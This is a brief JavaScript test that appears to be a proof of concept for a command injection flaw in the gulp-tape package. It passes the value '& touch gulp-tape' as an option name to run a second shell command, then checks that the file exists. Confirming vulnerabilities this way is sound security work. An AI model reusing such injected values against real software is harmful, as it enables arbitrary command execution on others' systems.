

test("Command Injection in gulp-tape", () => 
  {
    const root = require("gulp-tape");
    const gulp = require("gulp");
    const fs = require('fs');
    const path = './gulp-tape';
    const sleep = require('sleep');
    
    //checking that its not present already
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(false);
    
    var options = {
      name: "& touch gulp-tape"
    }
    
    gulp.src("./gulp-tape.js")
      .pipe(root(options));
    
    sleep.sleep(5);
    //checking that its created by after exploit.
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);

    fs.unlink(path, function(err) {});//deleting the file after creation
  });